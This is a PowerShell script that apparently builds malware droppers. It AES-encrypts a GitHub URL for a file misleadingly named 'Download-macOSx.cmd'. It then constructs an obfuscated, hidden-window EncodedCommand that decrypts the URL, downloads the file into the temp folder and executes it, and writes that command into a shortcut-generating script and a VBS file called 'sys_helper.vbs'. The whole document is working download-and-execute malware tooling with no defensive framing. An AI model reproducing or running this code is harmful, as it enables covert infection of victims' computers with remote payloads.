$url = "https://raw.githubusercontent.com/tiiisiet65-sudo/LoioioNoaisK/main/Download-macOSx.cmd"
$kBase64 = "ynpwLDExoBrFsg3uNDR9zlpCrueDnEqqzQ8lmimmp0Y="
$iBase64 = "sOMdDnGF9uk+XWTHXucA8A=="

$k = [Convert]::FromBase64String($kBase64)
$i = [Convert]::FromBase64String($iBase64)

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $k
$aes.IV = $i
$enc = $aes.CreateEncryptor()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($url)
$ct = $enc.TransformFinalBlock($bytes, 0, $bytes.Length)
$ctBase64 = [Convert]::ToBase64String($ct)

# Create EncodedCommand (0 instead of 1 for Read mode)
$cmd = "`$k=[Convert]::FromBase64String('$kBase64');`$i=[Convert]::FromBase64String('$iBase64');`$c=[Convert]::FromBase64String('$ctBase64');`$a=[System.Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$i;`$d=`$a.CreateDecryptor();`$m=New-Object IO.MemoryStream(,@(`$c));`$s=New-Object IO.MemoryStream;`$y=New-Object Security.Cryptography.CryptoStream(`$m,`$d,0);`$y.CopyTo(`$s);`$u=[Text.Encoding]::UTF8.GetString(`$s.ToArray());Invoke-WebRequest -Uri `$u -OutFile `$env:TEMP\s.cmd;& `$env:TEMP\s.cmd"
$bytesCmd = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$b64Cmd = [Convert]::ToBase64String($bytesCmd)

# Update Create-LNK-VBS.cmd
$f = "Create-LNK-VBS.cmd"
$content = Get-Content $f
for ($j=0; $j -lt $content.Length; $j++) {
    if ($content[$j] -match 'echo lnk.Arguments = "/c powershell -w hidden -EncodedCommand') {
        $content[$j] = 'echo lnk.Arguments = "/c powershell -w hidden -EncodedCommand ' + $b64Cmd + '" >> make_sc.vbs'
    }
}
$content | Set-Content $f

# Update sys_helper.vbs
$f = "Csharp-Version/sys_helper.vbs"
$content = Get-Content $f
for ($j=0; $j -lt $content.Length; $j++) {
    if ($content[$j] -match 'CreateObject\("WScript.Shell"\).Run "powershell -w hidden -EncodedCommand') {
        $content[$j] = 'CreateObject("WScript.Shell").Run "powershell -w hidden -EncodedCommand ' + $b64Cmd + '", 0, False'
    }
}
$content | Set-Content $f

Write-Host "Fixed mode"
